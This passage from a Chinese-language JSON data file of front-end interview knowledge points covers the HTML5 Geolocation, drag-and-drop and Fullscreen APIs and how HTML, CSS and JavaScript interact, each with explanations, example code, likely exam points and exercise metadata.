的一部分，大多数现代浏览器和移动设备都支持该 API，但具体的精度可能会根据设备的能力有所不同。部分设备可能只支持基于 IP 地址的定位，精度较低。\n\n### **应用场景**\n1. **地图与导航**：例如 Google Maps 这种基于用户地理位置提供服务的应用。\n2. **社交网络**：根据用户的当前位置推荐附近的朋友或活动。\n3. **位置相关的广告**：基于用户的位置，推送相关广告信息。\n4. **天气服务**：通过地理位置自动获取用户所在城市的天气状况。\n\n### **总结**\nHTML5 的 Geolocation API 提供了一种便捷的方式来获取用户的地理位置，适用于多种基于位置的应用。使用时需要注意隐私问题，并且根据网络条件和设备类型，定位的精度可能有所差异。",
    "testPoint": "### 1. **基本概念**\n   - **定义**：HTML5 的 Geolocation API 提供了一种简单的方法获取用户的地理位置，通常通过 GPS、IP 地址、Wi-Fi、蓝牙等方式获取。\n   - **主要用途**：用于基于位置的服务，如地图应用、附近服务推荐、位置打卡等。\n\n### 2. **如何使用 Geolocation API**\n   - **获取位置的基本方法**：\n     - `navigator.geolocation.getCurrentPosition(successCallback, errorCallback, options)`：获取当前的地理位置。\n     ```javascript\n     navigator.geolocation.getCurrentPosition(function(position) {\n         console.log('Latitude: ' + position.coords.latitude);\n         console.log('Longitude: ' + position.coords.longitude);\n     }, function(error) {\n         console.log('Error occurred. Error code: ' + error.code);\n     });\n     ```\n   - **实时监听位置变化**：\n     - `navigator.geolocation.watchPosition(successCallback, errorCallback, options)`：实时监听位置的变化，适用于移动设备上的应用。\n     ```javascript\n     const watchID = navigator.geolocation.watchPosition(function(position) {\n         console.log('Updated Latitude: ' + position.coords.latitude);\n         console.log('Updated Longitude: ' + position.coords.longitude);\n     });\n     ```\n\n### 3. **Geolocation API 的参数**\n   - **successCallback**：获取位置成功时调用的回调函数，返回 `position` 对象，包含 `coords` 属性（纬度、经度、精确度、速度、时间戳等）。\n   - **errorCallback**：获取位置失败时调用的回调函数，返回 `error` 对象，包含 `code` 和 `message` 属性。\n     - `error.code` 包含 3 个可能的错误值：\n       - `1`：用户拒绝了定位请求。\n       - `2`：无法获取位置（位置不可用）。\n       - `3`：获取位置超时。\n   - **options**：可选配置，包含以下参数：\n     - `enableHighAccuracy`：是否要求高精度定位，默认是 `false`。\n     - `timeout`：定位请求的超时时间。\n     - `maximumAge`：缓存的位置数据的有效时间，单位为毫秒。\n\n### 4. **Geolocation 的安全性**\n   - **用户隐私保护**：考察点可能涉及如何处理地理定位的隐私问题，浏览器通常会弹出提示让用户决定是否允许访问位置。\n   - **权限问题**：前端开发者需要确保用户同意授权访问地理位置，否者可能导致 `PERMISSION_DENIED` 错误。\n\n### 5. **错误处理**\n   - 常见错误包括用户拒绝提供位置信息（权限问题）、无法获取位置信息（设备无 GPS 支持）或定位超时等，如何在代码中处理这些情况是考察重点。\n\n### 6. **兼容性与降级处理**\n   - 并不是所有浏览器都支持 Geolocation API，因此需要检查浏览器兼容性，并提供降级方案。\n   - 如何判断浏览器是否支持 Geolocation API：\n     ```javascript\n     if (\"geolocation\" in navigator) {\n         // 支持\n     } else {\n         // 不支持，提供替代方案\n     }\n     ```\n\n### 7. **高精度模式**\n   - 通过 `options` 参数中的 `enableHighAccuracy` 来控制是否启用高精度模式（通常使用 GPS 定位，耗电量较大），考察点可能包括何时使用高精度定位，以及如何平衡性能与定位精度。\n\n### 8. **超时和最大缓存时间**\n   - `timeout` 用于设置请求位置的最大超时时间，`maximumAge` 用于控制缓存的地理位置信息的有效时间，如何合理配置这些参数以平衡性能和用户体验是考点之一。\n\n### 9. **停止监听位置**\n   - **停止位置监听**：使用 `navigator.geolocation.clearWatch(watchID)` 停止对位置变化的监听，考察点可能包括如何适时地清理监听，避免资源浪费。\n   ```javascript\n   navigator.geolocation.clearWatch(watchID);\n   ```\n\n### 10. **使用场景**\n   - 考题可能涉及哪些场景下适合使用地理定位功能，例如在地图应用、地理围栏、物流跟踪、个性化内容推荐等基于位置的应用中如何利用 Geolocation API。\n\n### 11. **Geolocation API 的性能问题**\n   - **高频率调用问题**：如果频繁调用 `getCurrentPosition` 或者使用 `watchPosition` 来持续获取位置，可能会带来性能开销和耗电问题，尤其是在移动设备上。\n   - **如何优化**：考点可能涉及如何合理设置 `watchPosition` 的 `timeout` 和 `maximumAge` 参数来优化性能。\n\n### 12. **移动设备与桌面设备的差异**\n   - 考察 Web 和移动设备上使用 Geolocation API 的差异，如移动设备通常有 GPS，可以更精确地提供地理位置，而桌面设备通常依赖 Wi-Fi 或 IP 地址，精度较低。\n\n### 13. **地理位置数据的使用**\n   - 可能会考察如何在前端应用中结合 Geolocation API 与第三方地图服务（如 Google Maps、Leaflet）进行地图渲染或位置标记。\n",
    "exerciseKeyList": "[\"0fad3c15-63fe-4358-a202-397c983cae6f\"]",
    "vipLimit": 0,
    "level": 3,
    "pointOrder": 16,
    "createAt": "2024-10-16T12:04:33.000Z",
    "updateAt": "2024-11-06T06:12:54.000Z",
    "$progressExercise": "",
    "$exerciseList": [
      {
        "exerciseKey": "0fad3c15-63fe-4358-a202-397c983cae6f",
        "title": "怎么在页面上获取用户的定位信息？",
        "category": "QA",
        "vipLimit": 1,
        "createAt": "2024-10-16T12:07:32.000Z",
        "updateAt": "2024-10-16T12:07:35.000Z"
      }
    ]
  },
  "141": {
    "id": 141,
    "tagId": 12,
    "title": "拖放API",
    "explanation": "HTML5 中的拖拽（Drag and Drop，简称 DnD）功能为网页元素提供了原生的拖放支持。通过 HTML5 的拖放 API，开发者可以让元素变得可拖动，并实现拖拽和释放的交互效果。\n\n### **HTML5 拖拽的基本原理**\nHTML5 拖拽操作的核心是 `dragstart`、`dragover` 和 `drop` 等事件。以下是拖拽的工作流程：\n\n1. **可拖动元素**：使用 `draggable=\"true\"` 使一个元素可被拖拽。\n2. **源元素触发拖拽**：当用户点击并开始拖动可拖动元素时，触发 `dragstart` 事件。\n3. **拖拽中**：拖拽过程中，目标区域会触发 `dragover` 事件。\n4. **释放元素**：当用户释放被拖动的元素到目标区域时，目标会触发 `drop` 事件。\n\n### **实现步骤**\n\n1. **设置拖拽元素**：使用 `draggable=\"true\"` 使 HTML 元素可拖动。\n2. **监听拖拽事件**：\n   - `dragstart`：当拖拽开始时触发。\n   - `dragover`：在拖拽过程中，拖动到可放置目标区域时持续触发。\n   - `drop`：当拖动的元素被释放到目标区域时触发。\n\n3. **阻止默认行为**：`dragover` 和 `drop` 事件默认情况下是禁止的，需要使用 `event.preventDefault()` 来阻止默认行为，从而允许放置元素。\n\n### **拖拽的相关事件**\n- `dragstart`：在拖动开始时触发，用来设置拖动数据（如拖动的数据类型和数据内容）。\n- `dragend`：拖动操作结束时触发，可以用来清理状态。\n- `dragenter`：当拖动的元素进入目标区域时触发。\n- `dragover`：当拖动元素在目标区域上方移动时持续触发，默认情况下不会触发 `drop`，因此需要通过 `event.preventDefault()` 来允许放置。\n- `dragleave`：当拖动的元素离开目标区域时触发。\n- `drop`：当拖动的元素释放到目标区域时触发，可以获取拖动的数据。\n\n### **拖拽实例**\n\n```html\n<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n  <meta charset=\"UTF-8\">\n  <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n  <title>HTML5 拖拽示例</title>\n  <style>\n    #dragElement {\n      width: 100px;\n      height: 100px;\n      background-color: lightcoral;\n      text-align: center;\n      line-height: 100px;\n      cursor: grab;\n    }\n\n    #dropZone {\n      width: 200px;\n      height: 200px;\n      background-color: lightblue;\n      margin-top: 20px;\n      text-align: center;\n      line-height: 200px;\n    }\n  </style>\n</head>\n<body>\n  <div id=\"dragElement\" draggable=\"true\">拖拽我</div>\n  <div id=\"dropZone\">放置到这里</div>\n\n  <script>\n    // 获取元素\n    const dragElement = document.getElementById('dragElement');\n    const dropZone = document.getElementById('dropZone');\n\n    // 拖拽开始事件\n    dragElement.addEventListener('dragstart', function(event) {\n      // 设置数据，类型和内容\n      event.dataTransfer.setData('text', event.target.id);\n    });\n\n    // 拖拽过程中在目标上方移动时，必须阻止默认行为\n    dropZone.addEventListener('dragover', function(event) {\n      event.preventDefault();\n    });\n\n    // 放置事件\n    dropZone.addEventListener('drop', function(event) {\n      event.preventDefault(); // 阻止默认行为\n      const data = event.dataTransfer.getData('text');\n      const draggedElement = document.getElementById(data);\n      event.target.appendChild(draggedElement); // 将拖动的元素放入目标区域\n    });\n  </script>\n</body>\n</html>\n```\n\n### **代码说明**\n- **拖拽元素**：`draggable=\"true\"` 使得 `#dragElement` 可拖动。\n- **拖拽开始**：`dragstart` 事件设置了拖拽的元素数据，存入 `dataTransfer` 对象中。\n- **允许放置**：`dragover` 事件通过 `event.preventDefault()` 允许拖拽元素放置在目标区域。\n- **放置元素**：`drop` 事件在目标区域中，通过 `event.dataTransfer.getData()` 获取拖动的数据并进行处理。",
    "testPoint": "### 1. **基本概念与原理**\n   - **定义**：HTML5 提供了内置的拖拽功能，通过 `draggable` 属性和 Drag and Drop API 实现元素拖放操作。\n   - **原理**：拖拽功能依赖一系列事件，如 `dragstart`、`drag`、`dragend`、`dragover`、`drop` 等来实现拖放操作。\n\n### 2. **如何启用拖拽**\n   - **draggable 属性**：默认情况下，HTML 元素是不可拖拽的。要启用拖拽，需要设置元素的 `draggable=\"true\"`。\n   ```html\n   <div draggable=\"true\">Drag me!</div>\n   ```\n   - **事件绑定**：考察点可能包括如何通过 `dragstart` 等事件处理拖拽行为。\n   ```javascript\n   const draggableElement = document.getElementById('draggable');\n   draggableElement.addEventListener('dragstart', (event) => {\n       event.dataTransfer.setData('text/plain', 'This is a draggable element');\n   });\n   ```\n\n### 3. **Drag and Drop 的核心事件**\n   - **dragstart**：用户开始拖动时触发，通常用于设置拖拽的数据和外观。\n   - **drag**：在拖动过程中持续触发，可用于动态更新拖拽效果。\n   - **dragend**：拖动结束时触发，可以用于清除拖拽状态。\n   - **dragenter**：被拖拽的元素进入可放置区域时触发。\n   - **dragover**：在拖动元素悬停在放置区域时持续触发，通常需要调用 `event.preventDefault()` 来允许放置。\n   - **dragleave**：当拖动元素离开放置区域时触发。\n   - **drop**：用户放开被拖动的元素时触发，用于处理放置操作。\n\n### 4. **数据传输**\n   - **dataTransfer 对象**：`event.dataTransfer` 是拖拽过程中传输数据的关键对象。常见考点包括如何通过 `dataTransfer.setData()` 和 `dataTransfer.getData()` 方法在 `dragstart` 和 `drop` 事件之间传递数据。\n   ```javascript\n   // dragstart 中设置数据\n   event.dataTransfer.setData('text', 'Dragged Data');\n   \n   // drop 中获取数据\n   const data = event.dataTransfer.getData('text');\n   ```\n   - **传输多种数据类型**：考察如何传输不同的数据类型（如文本、URL、文件等）以及如何处理这些数据。\n\n### 5. **dropzone 区域的设置**\n   - **允许放置元素**：默认情况下，放置区域不会接受被拖拽的元素，需要在 `dragover` 事件中调用 `event.preventDefault()` 来显式地允许放置操作。\n   ```javascript\n   const dropzone = document.getElementById('dropzone');\n   dropzone.addEventListener('dragover', (event) => {\n       event.preventDefault();  // 允许放置\n   });\n   ```\n\n### 6. **拖拽的样式处理**\n   - **自定义拖拽效果**：通过 `event.dataTransfer.setDragImage()` 设置自定义的拖拽图片，考察点可能包括如何替换默认的拖拽预览图。\n   ```javascript\n   event.dataTransfer.setDragImage(imageElement, offsetX, offsetY);\n   ```\n   - **拖拽时的 CSS 样式**：考察如何使用 CSS 类和事件配合，实现拖拽时的视觉效果。\n   ```css\n   .dragging {\n       opacity: 0.5;\n   }\n   ```\n\n### 7. **跨页面或跨应用的拖拽**\n   - **跨文档拖拽**：考察是否了解如何处理跨 iframe 或浏览器窗口的拖拽。\n   - **拖拽文件**：用户可以将外部文件（如从桌面拖动文件）拖入浏览器的 `dropzone`，需要处理 `dataTransfer.files` 属性。\n   ```javascript\n   const files = event.dataTransfer.files;\n   ```\n\n### 8. **拖拽与输入法的冲突**\n   - 在移动设备上，拖拽和触摸事件可能存在冲突，因此考察点可能包括如何处理拖拽在移动端的实现或替代方案。\n\n### 9. **可访问性**\n   - **键盘可用性**：默认拖拽操作主要依赖鼠标，因此考察点可能包括如何使拖拽操作可通过键盘导航，确保网站的无障碍性。\n   - **ARIA 支持**：在实现拖拽功能时，如何使用 ARIA 属性为屏幕阅读器用户提供反馈是常见的可访问性考察点。\n\n### 10. **兼容性**\n   - **浏览器兼容性**：HTML5 拖拽在不同浏览器中的支持情况不一致，尤其是在移动端，考察点可能包括如何处理浏览器兼容性问题，特别是在触摸设备上使用拖拽功能时的挑战。\n\n### 11. **常见的应用场景**\n   - **文件上传**：通过拖拽文件进行上传是常见的考察场景，如何实现文件的拖放上传功能是常见问题。\n   - **可拖拽列表**：如何通过拖拽重新排序列表项，如实现类似于 `Trello` 的拖放功能。\n   - **游戏和图形界面**：拖放在交互式游戏或图形应用中被广泛使用，可能会考察如何通过拖拽元素实现复杂的交互效果。\n\n### 12. **事件顺序**\n   - 了解拖拽过程中的事件触发顺序也是一个重要的考察点，常见顺序为：`dragstart` -> `drag` -> `dragenter` -> `dragover` -> `drop` -> `dragend`。\n\n### 13. **拖拽的取消**\n   - **取消拖拽**：通过调用 `event.preventDefault()` 可以阻止某些拖拽事件的默认行为，如取消 `drop` 事件。\n\n### 14. **使用 JavaScript 框架实现拖拽**\n   - 有些前端面试可能会考察如何利用 JavaScript 框架（如 React、Vue、Angular）实现拖拽交互，以及如何处理拖拽相关的状态管理和数据绑定。",
    "exerciseKeyList": "[\"6efa769a-3eb9-44ea-bd7c-01c5c991000f\"]",
    "vipLimit": 0,
    "level": 2,
    "pointOrder": 17,
    "createAt": "2024-10-17T01:28:10.000Z",
    "updateAt": "2024-11-06T06:12:54.000Z",
    "$progressExercise": "",
    "$exerciseList": [
      {
        "exerciseKey": "6efa769a-3eb9-44ea-bd7c-01c5c991000f",
        "title": "怎么使用 js 实现拖拽功能？\n",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-11-17T14:39:59.000Z",
        "updateAt": "2024-08-10T17:06:01.000Z"
      }
    ]
  },
  "142": {
    "id": 142,
    "tagId": 12,
    "title": "全屏API",
    "explanation": "在 HTML 中，可以通过调用浏览器的全屏 API 实现页面或页面中的某个元素全屏显示。全屏 API 是 HTML5 提供的一项功能，允许将元素切换为全屏模式。\n\n### **使用全屏 API 实现全屏**\n全屏 API 提供了以下常用方法和属性：\n- `requestFullscreen()`：请求将元素设置为全屏模式。\n- `exitFullscreen()`：退出全屏模式。\n- `fullscreenElement`：返回当前正在全屏显示的 DOM 元素，如果没有元素全屏，则返回 `null`。\n- `fullscreenchange` 事件：当全屏状态发生变化时触发，用来监听进入或退出全屏。\n\n### **实现全屏的基本步骤**\n1. 选择你希望全屏的元素。\n2. 使用 `element.requestFullscreen()` 方法来进入全屏。\n3. 使用 `document.exitFullscreen()` 来退出全屏模式。\n\n### **示例代码**\n\n```html\n<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n  <meta charset=\"UTF-8\">\n  <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n  <title>全屏示例</title>\n  <style>\n    #fullscreenContent {\n      width: 100px;\n      height: 100px;\n      background-color: lightblue;\n      margin: 50px auto;\n      text-align: center;\n      line-height: 100px;\n    }\n  </style>\n</head>\n<body>\n\n  <div id=\"fullscreenContent\">点击全屏</div>\n  <button id=\"exitFullscreenBtn\" style=\"display:none;\">退出全屏</button>\n\n  <script>\n    const fullscreenContent = document.getElementById('fullscreenContent');\n    const exitFullscreenBtn = document.getElementById('exitFullscreenBtn');\n\n    // 进入全屏模式\n    fullscreenContent.addEventListener('click', function() {\n      if (fullscreenContent.requestFullscreen) {\n        fullscreenContent.requestFullscreen();\n      } else if (fullscreenContent.mozRequestFullScreen) { // Firefox\n        fullscreenContent.mozRequestFullScreen();\n      } else if (fullscreenContent.webkitRequestFullscreen) { // Chrome, Safari and Opera\n        fullscreenContent.webkitRequestFullscreen();\n      } else if (fullscreenContent.msRequestFullscreen) { // IE/Edge\n        fullscreenContent.msRequestFullscreen();\n      }\n      exitFullscreenBtn.style.display = 'inline-block';\n    });\n\n    // 退出全屏模式\n    exitFullscreenBtn.addEventListener('click', function() {\n      if (document.exitFullscreen) {\n        document.exitFullscreen();\n      } else if (document.mozCancelFullScreen) { // Firefox\n        document.mozCancelFullScreen();\n      } else if (document.webkitExitFullscreen) { // Chrome, Safari and Opera\n        document.webkitExitFullscreen();\n      } else if (document.msExitFullscreen) { // IE/Edge\n        document.msExitFullscreen();\n      }\n      exitFullscreenBtn.style.display = 'none';\n    });\n\n    // 监听全屏状态变化\n    document.addEventListener('fullscreenchange', () => {\n      console.log('全屏状态发生变化');\n    });\n  </script>\n\n</body>\n</html>\n```\n\n### **代码解释**\n1. **进入全屏**：点击 `#fullscreenContent` 的 div 时，调用 `requestFullscreen()` 方法使该元素进入全屏模式。\n2. **退出全屏**：点击按钮 `#exitFullscreenBtn`，调用 `document.exitFullscreen()` 退出全屏模式。\n3. **跨浏览器兼容性**：由于部分浏览器的全屏 API 有不同的实现方法，代码中兼容了各个主流浏览器的实现（例如 Chrome, Firefox, Safari, Edge）。\n4. **监听全屏状态变化**：使用 `fullscreenchange` 事件来监听当前全屏模式的变化，可以在进入或退出全屏时执行额外操作。\n\n### **全屏 API 的一些注意事项**\n- 全屏 API 只能在用户交互（如点击或按键事件）后触发，不能通过脚本自动进入全屏模式，这是为了防止用户体验被打断。\n- 不同浏览器的全屏 API 实现可能稍有不同，因此通常需要做一些兼容性处理。\n- 在移动端设备上，全屏模式的行为可能与桌面端有所不同。\n\n### **总结**\nHTML5 的全屏 API 提供了一种简单而直观的方法来让页面或元素进入全屏模式。通过 `requestFullscreen()` 方法可以将任意元素全屏显示，`exitFullscreen()` 则用来退出全屏模式。结合 `fullscreenchange` 事件可以对全屏状态进行监控，实现更加丰富的交互体验。",
    "testPoint": "### 1. **全屏 API 的基本概念**\n   - **定义**：全屏 API 允许开发者通过 JavaScript 将页面中的某个元素或整个页面切换到全屏模式，使其填充整个显示器。\n   - **主要用途**：常见于视频播放、图表展示、游戏、幻灯片等需要用户专注于内容的场景。\n\n### 2. **启用全屏**\n   - **进入全屏**：通过调用元素的 `requestFullscreen()` 方法可以使该元素进入全屏模式，常考点包括如何正确使用该方法。\n   ```javascript\n   const element = document.getElementById('myElement');\n   element.requestFullscreen();\n   ```\n   - **前缀兼容**：某些浏览器使用前缀（如 `webkitRequestFullscreen` 或 `mozRequestFullScreen`），考察点可能包括如何处理跨浏览器的兼容性。\n   ```javascript\n   element.requestFullscreen = element.requestFullscreen || \n                               element.webkitRequestFullscreen || \n                               element.mozRequestFullScreen || \n                               element.msRequestFullscreen;\n   element.requestFullscreen();\n   ```\n\n### 3. **退出全屏**\n   - **退出全屏**：通过 `document.exitFullscreen()` 方法退出全屏模式，考察点包括如何实现全屏模式的切换。\n   ```javascript\n   if (document.fullscreenElement) {\n       document.exitFullscreen();\n   }\n   ```\n   - **退出全屏的兼容性**：和进入全屏一样，部分浏览器可能需要使用前缀版本的 `exitFullscreen` 方法。\n\n### 4. **全屏状态检测**\n   - **fullscreenElement 属性**：通过 `document.fullscreenElement` 检测当前是否有元素处于全屏状态，返回当前处于全屏状态的元素。\n   ```javascript\n   if (document.fullscreenElement) {\n       console.log('Element is in full-screen mode');\n   } else {\n       console.log('No element in full-screen mode');\n   }\n   ```\n\n### 5. **全屏 API 的事件**\n   - **fullscreenchange 事件**：当页面进入或退出全屏模式时，会触发 `fullscreenchange` 事件。常考点包括如何监听全屏状态的变化并执行相应的逻辑。\n   ```javascript\n   document.addEventListener('fullscreenchange', () => {\n       if (document.fullscreenElement) {\n           console.log('Entered full-screen mode');\n       } else {\n           console.log('Exited full-screen mode');\n       }\n   });\n   ```\n   - **fullscreenerror 事件**：当进入全屏模式的请求失败时，会触发 `fullscreenerror` 事件。考察点可能包括如何处理错误并进行降级处理。\n   ```javascript\n   document.addEventListener('fullscreenerror', (event) => {\n       console.log('Error attempting to enable full-screen mode', event);\n   });\n   ```\n\n### 6. **全屏 API 的兼容性**\n   - **跨浏览器支持**：不同浏览器对全屏 API 的支持情况不同，尤其是旧版浏览器可能需要带有前缀的方法（如 `webkitRequestFullscreen` 或 `mozRequestFullScreen`）。如何处理这些兼容性问题是常见考点。\n\n### 7. **全屏与 CSS**\n   - **CSS 样式影响**：当页面进入全屏模式后，可能会影响一些 CSS 样式的表现，例如元素的 `position`、`z-index` 等。考察点包括如何处理全屏模式下的 CSS 样式布局问题。\n   - **:fullscreen 伪类**：全屏模式下，浏览器会自动应用 `:fullscreen` 伪类，可以用于自定义全屏模式下的样式。\n   ```css\n   :fullscreen {\n       background-color: black;\n   }\n   ```\n\n### 8. **全屏 API 的限制**\n   - **用户交互限制**：现代浏览器出于安全原因，通常要求全屏请求必须由用户的某个操作（如点击按钮）触发，而不能通过自动执行脚本进入全屏。考察点可能包括如何处理这种限制。\n   ```javascript\n   button.addEventListener('click', () => {\n       element.requestFullscreen();\n   });\n   ```\n   \n### 9. **全屏模式与多屏幕支持**\n   - **多显示器情况下的全屏**：考察点可能包括在多屏幕环境中使用全屏 API 的表现，尤其是如何处理多个显示器的分辨率和窗口显示。\n\n### 10. **全屏 API 的应用场景**\n   - **视频播放**：全屏 API 常用于视频播放器中，考察点可能包括如何在视频播放时切换全屏，并处理退出全屏的逻辑。\n   - **游戏和图形应用**：如何在游戏或图形应用中使用全屏模式，以提升用户体验和沉浸感。\n   - **幻灯片或演示文稿**：在展示幻灯片时，如何利用全屏 API 来增强展示效果。\n\n### 11. **错误处理**\n   - **权限限制**：部分浏览器或操作系统可能会限制或阻止全屏请求，尤其是在移动设备上，考察如何处理这些情况并提供反馈。\n   - **异步操作**：进入或退出全屏模式通常是异步操作，如何确保用户体验的流畅性也是一个重要考点。\n\n### 12. **性能影响**\n   - **全屏模式的性能问题**：考察点可能涉及全屏模式下页面渲染、动画或媒体播放的性能影响，如何优化性能以避免全屏模式下的卡顿或延迟。\n\n### 13. **移动设备支持**\n   - **移动端的全屏支持**：全屏 API 在移动设备上的支持存在差异，尤其是如何处理不同设备上的全屏显示，如处理 iOS Safari 对全屏模式的支持情况。\n\n### 14. **UI 变化的处理**\n   - **隐藏 UI 控件**：考察如何在全屏模式下隐藏一些不必要的 UI 元素（如导航栏、按钮），从而提供更好的沉浸式体验，并在退出全屏时恢复这些 UI。\n",
    "exerciseKeyList": "[\"5e6f561b-5c29-482e-b07b-f08a4aa11432\"]",
    "vipLimit": 0,
    "level": 3,
    "pointOrder": 18,
    "createAt": "2024-10-17T01:40:49.000Z",
    "updateAt": "2024-11-06T06:12:54.000Z",
    "$progressExercise": "",
    "$exerciseList": [
      {
        "exerciseKey": "5e6f561b-5c29-482e-b07b-f08a4aa11432",
        "title": "怎么让页面上的某块区域全屏展示？",
        "category": "QA",
        "vipLimit": 1,
        "createAt": "2024-10-17T01:40:29.000Z",
        "updateAt": "2024-10-17T01:40:36.000Z"
      }
    ]
  },
  "143": {
    "id": 143,
    "tagId": 12,
    "title": "与 CSS/JS 的交互",
    "explanation": "HTML、CSS 和 JavaScript 是前端开发的三大基础技术，它们通过不同的方式相互作用，创建交互性良好的网页。\n\n### 1. **HTML 与 CSS 的交互**\nHTML 负责定义网页的结构，而 CSS 则负责美化这些结构元素。两者的交互主要通过以下方式：\n\n- **`<style>` 标签**：直接在 HTML 中嵌入 CSS 样式。\n  ```html\n  <style>\n    h1 {\n      color: red;\n    }\n  </style>\n  ```\n  这种方式将 CSS 写入到 HTML 文件中，但不推荐用于大型项目，因为这会导致样式与结构混杂在一起。\n\n- **`<link>` 标签**：通过 `<link>` 标签引入外部 CSS 文件。\n  ```html\n  <link rel=\"stylesheet\" href=\"styles.css\">\n  ```\n  这种方式通常用于大型项目中，将样式与结构分离，维护更加清晰。\n\n- **内联样式**：直接将样式属性写在 HTML 标签内。\n  ```html\n  <h1 style=\"color: blue;\">这是一个标题</h1>\n  ```\n  这种方式适合临时的小改动，但不推荐频繁使用，尤其在大型项目中不利于维护。\n\n### 2. **HTML 与 JavaScript 的交互**\nJavaScript 负责操作和控制网页内容，主要与 HTML 进行交互以实现动态效果。以下是交互方式：\n\n- **`<script>` 标签**：通过 `<script>` 标签直接在 HTML 中嵌入 JavaScript 代码。\n  ```html\n  <script>\n    alert('这是一个弹窗');\n  </script>\n  ```\n  此方法会在 HTML 中直接执行 JavaScript，适合小规模的脚本。\n\n- **外部 JavaScript 文件**：通过 `<script>` 标签引入外部 JavaScript 文件。\n  ```html\n  <script src=\"script.js\"></script>\n  ```\n  这种方式将 JavaScript 逻辑与 HTML 分离，便于维护和重用。\n\n- **DOM 操作**：通过 JavaScript 操作 DOM（文档对象模型），动态更改 HTML 元素的内容和属性。例如：\n  ```html\n  <p id=\"text\">这是原始文本</p>\n  <script>\n    document.getElementById('text').innerText = '这是通过 JS 改变的文本';\n  </script>\n  ```\n\n- **事件监听**：JavaScript 可以通过事件监听器响应用户的交互。例如：\n  ```html\n  <button id=\"btn\">点击我</button>\n  <script>\n    document.getElementById('btn').addEventListener('click', function() {\n      alert('按钮被点击了');\n    });\n  </script>\n  ```\n\n### 3. **CSS 与 JavaScript 的交互**\nJavaScript 也可以与 CSS 进行交互，动态地控制页面的样式。常见的方法有：\n\n- **动态添加或修改样式**：JavaScript 可以通过操作 DOM 元素的 `style` 属性直接修改 CSS 样式。\n  ```html\n  <div id=\"box\" style=\"width: 100px; height: 100px; background-color: red;\"></div>\n  <button onclick=\"changeColor()\">改变颜色</button>\n\n  <script>\n    function changeColor() {\n      document.getElementById('box').style.backgroundColor = 'blue';\n    }\n  </script>\n  ```\n\n- **操作类名**：通过 JavaScript 动态添加、删除或切换 HTML 元素的 `class` 属性，从而改变其样式。\n  ```html\n  <div id=\"box\" class=\"red-box\"></div>\n  <button onclick=\"toggleBox()\">切换样式</button>\n\n  <style>\n    .red-box { background-color: red; width: 100px; height: 100px; }\n    .blue-box { background-color: blue; }\n  </style>\n\n  <script>\n    function toggleBox() {\n      document.getElementById('box').classList.toggle('blue-box');\n    }\n  </script>\n  ```\n\n- **CSS 变量与 JavaScript 交互**：JavaScript 可以操作 CSS 变量（自定义属性）来动态修改样式。\n  ```html\n  <style>\n    :root {\n      --main-color: red;\n    }\n    div {\n      background-color: var(--main-color);\n      width: 100px;\n      height: 100px;\n    }\n  </style>\n\n  <div></div>\n  <button onclick=\"changeColor()\">改变颜色</button>\n\n  <script>\n    function changeColor() {\n      document.documentElement.style.setProperty('--main-color', 'blue');\n    }\n  </script>\n  ```\n\n### **总结**\nHTML 提供网页的结构，CSS 提供样式，JavaScript 提供动态交互。三者通过嵌入、引入、DOM 操作、事件监听等方式进行交互，构建出复杂且具有良好用户体验的网页和应用。",
    "testPoint": "### 1. **DOM 操作**\n- **理解 DOM（文档对象模型）**：考察候选人是否理解 DOM 树的结构及其操作方式，如如何通过 JavaScript 操作 HTML 元素的属性、内容、样式。\n  - 示例问题：如何通过 JavaScript 操作 DOM 元素的 `class` 或 `style`？\n  \n- **DOM 操作性能优化**：了解如何减少 DOM 操作的频率，如何使用文档碎片（Document Fragment）提高操作性能。\n  - 示例问题：如何优化频繁的 DOM 操作，减少重绘和回流？\n\n### 2. **事件处理**\n- **事件绑定**：考察如何通过 JavaScript 绑定事件监听器，以及事件冒泡、捕获机制。\n  - 示例问题：请解释事件冒泡和捕获的原理，以及如何阻止事件冒泡？\n  \n- **委托事件**：当有大量动态生成的 DOM 元素时，如何通过事件委托提高性能。\n  - 示例问题：如何使用事件委托优化对大量子元素的事件处理？\n\n### 3. **CSS 与 JavaScript 的交互**\n- **动态样式控制**：使用 JavaScript 动态添加、修改、删除元素的 CSS 样式。\n  - 示例问题：如何通过 JavaScript 动态改变页面元素的样式？如何使用 `classList` 控制 CSS 类？\n  \n- **CSS 变量与 JavaScript**：考察对 CSS 自定义属性（CSS 变量）的理解，以及如何通过 JavaScript 操作它们。\n  - 示例问题：如何通过 JavaScript 修改 CSS 变量（CSS 自定义属性）？\n\n### 4. **内联与外部资源的加载**\n- **内联样式与脚本**：理解如何通过内联样式和脚本对 HTML 进行直接控制，以及这种方式的优缺点。\n  - 示例问题：内联样式和外部样式文件相比有何不同？何时使用内联脚本？\n  \n- **异步加载脚本和样式**：理解 `async`、`defer` 属性对 `<script>` 的影响，以及 `link` 标签中的预加载机制。\n  - 示例问题：`async` 和 `defer` 的区别是什么？如何优化资源的加载顺序？\n\n### 5. **表单交互与验证**\n- **表单控件交互**：考察如何通过 JavaScript 操作表单元素，监听表单的提交，进行数据验证和提交。\n  - 示例问题：如何使用 JavaScript 禁用表单的默认提交行为？如何实时监听表单输入？\n  \n- **HTML5 表单验证 API**：考察如何利用原生的表单验证 API 进行表单验证，而不是依赖 JavaScript 实现。\n  - 示例问题：请说明 HTML5 表单验证的工作原理及常见使用方法。\n\n### 6. **事件机制与交互**\n- **捕获、冒泡与阻止默认行为**：需要理解事件的传播机制，并在需要时阻止默认行为。\n  - 示例问题：如何在点击链接时阻止它的默认跳转行为？如何在父元素上拦截并处理子元素的事件？\n  \n### 7. **性能优化相关**\n- **懒加载**：考察如何通过 JavaScript 实现资源的懒加载，以优化页面加载性能。\n  - 示例问题：如何实现图片的懒加载？\n\n- **脚本与样式的异步加载**：理解如何通过 `async`、`defer` 实现脚本的异步加载，以及 `preload`、`prefetch` 优化资源加载。\n  - 示例问题：如何异步加载一个外部 JavaScript 文件？`preload` 与 `prefetch` 有什么区别？\n\n### 8. **响应式设计与动态样式**\n- **媒体查询与 JavaScript 响应式处理**：如何结合媒体查询与 JavaScript 实现响应式设计，并根据屏幕尺寸、设备类型等动态修改样式。\n  - 示例问题：如何通过 JavaScript 检测设备屏幕尺寸并动态调整页面样式？\n\n### 9. **跨域与安全**\n- **CORS（跨域资源共享）**：理解如何通过 HTML 和 JavaScript 